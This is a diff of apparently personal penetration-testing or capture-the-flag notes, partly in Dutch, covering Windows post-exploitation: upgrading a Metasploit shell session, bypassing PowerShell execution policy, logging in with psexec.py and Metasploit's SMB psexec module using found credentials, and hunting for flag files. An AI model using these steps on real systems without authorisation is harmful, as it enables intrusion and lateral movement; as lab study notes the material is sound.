@@ -22,7 +22,7 @@ this will give you access to target system through command shell session.
 	- set lport (make sure its not the same as the existing shell session)
 	- set session to shell session 
 	- show advanced: 
-		-` set WIN_TRANSFER VBS`
+		pwd
 
 **powershell -ep bypass .\script.ps1** 
 Hiermee wordt het uitvoeringsbeleid tijdelijk omzeild voor de huidige sessie, zodat het script kan worden uitgevoerd zonder problemen met de uitvoeringsbeleidsinstellingen.**
@@ -51,10 +51,12 @@ login on target system with psexec.py:
 	- `net user `
 	- `whoami /priv `
 
+search in cmd: `dir /s *flag*` searches in current folder and sub folders.
+cat in CMD is type 
 
 Method 2 is with meterpreter session 
 - search psexec 
-- use exploit/windows/smb/psexec 
+- use`` exploit/windows/smb/psexec ``
 - set lport that does not conflict with current sessions 
 - set smb-password and smb-username with found credentials 
 
